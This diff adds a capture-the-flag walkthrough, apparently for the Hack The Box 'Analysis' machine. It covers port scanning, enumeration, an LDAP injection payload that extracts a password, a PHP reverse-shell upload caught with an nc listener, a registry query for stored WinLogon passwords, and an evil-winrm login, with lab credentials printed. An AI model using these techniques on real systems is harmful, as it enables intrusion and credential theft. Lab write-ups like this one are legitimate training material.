@@ -1,0 +1,163 @@
+nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001 analysis.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 15:13 EET
+Nmap scan report for 10.129.233.25
+Host is up (0.063s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-23 13:13:46Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3306/tcp  open  mysql         MySQL (unauthorized)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-01-23T13:14:15
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+We try enum4linux
+└─$enum4linux -u 'guest' -p '' -a analysis.htb || enum4linux -a analysis.htb
+smbclient
+└─$smbclient -U '' -L \\\\analysis.htb\\ 
+smbmap
+└─$smbmap -u null -p null -H analysis.htb
+
+
+Try to connect to mysql on port 3306 but we get error
+└─$mysql -h analysis.htb -u root -p
+
+Try ldap search but we get error
+└─$ ldapsearch -H ldap://analysis.htb -x 
+
+
+Directory bruteforcing
+└─$ gobuster dir -u http://analysis.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+└─$ gobuster dir -u http://analysis.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x jsp,asp
+
+
+Subdomain enumeration
+└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://analysis.htb -H "Host: FUZZ.analysis.htb" 
+
+The directory bruteforcing on the new subdomain
+└─$feroxbuster -u https://internal.analysis.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://internal.analysis.htb/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET       29l       93w     1284c http://internal.analysis.htb/
+301      GET        2l       10w      170c http://internal.analysis.htb/users => http://internal.analysis.htb/users/
+200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
+301      GET        2l       10w      174c http://internal.analysis.htb/dashboard => http://internal.analysis.htb/dashboard/
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img => http://internal.analysis.htb/dashboard/img/
+200      GET        4l        5w       38c http://internal.analysis.htb/dashboard/index.php
+[[Redacted]]
+
+
+we find http://internal.analysis.htb/users/list.php which when we access it we get that we are missing a parameter. Then i get a list of parameters, put them to Burp Intruder and we find the parameter [name]
+
+Tried sqlmap but it was not vulnerable
+└─$ sqlmap -u http://internal.analysis.htb/users/list.php?name=
+[16:04:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:04:15] [WARNING] GET parameter 'name' does not seem to be injectable
+[16:04:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                                                                                
+[*] ending @ 16:04:15 /2024-01-23/
+
+We could also try kerbrute with a bunch of usernames i used xato-net-10-million-usernames.txt and added the @analysis.htb on every name
+sed -i "s|$|@analysis.htb|" names.txt
+
+└─$./kerbrute userenum --dc 10.129.233.25 -d analysis.htb ../htb/xato-net-10-million-usernames.txt 
+
+We found a http://internal.analysis.htb/employees/login.php portal and we could try to bruteforce with some of the usename we get validated but that does not work.
+
+If we try http://internal.analysis.htb/users/list.php?name=*, so with wildcard at the end we get an output with a search result and a name "technician. So then we think of ldap blind injection.
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md
+
+we find http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description=*)
+
+To find the description attribute we try different attributes until we get the result in the webpage.
+So if we change the description to "password" we wont see anymore the technician field. Which we know technician is a user from kerbrute results.
+
+we use Burp Intruder again on the description=$$ and we search for every letter that would output in the respone the technician
+So first we find the letter 9, then use "9&&" and keep going.
+
+Creds: technician@analysis.htb:97NTtl*4QP96Bv
+
+Log in to portal with creds.
+
+/dashboard/upload.php is allowed to upload file into the remote machine. When i try to upload a file with name reverse-shell.php it does not get uploaded, i thought that the php extension was doing that and tried to bypass it but it did not work. Then i changed the name from reverse-shell to name.php and it worked. It's filters might be for the name. Then visit the /uploads/name.php and get shell on your listener nc -lvnp 4444.
+
+whoami /priv does not give us anything
+
+Search the list.php file we found ldap_password for user webservice@analysis.htb:N1G6G46G@G!j
+
+Tried evil-winrm but did not connect with those creds.
+
+used reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" which stores default password and we find password of jdoe
+
+creds: 
+jdoe:7y4Z4^*y9Zzj
+
+evil-winrm -i 10.129.233.25 -u jdoe -p '7y4Z4^*y9Zzj'
+
+
+
+
+
+
+
+
+
+
+
+
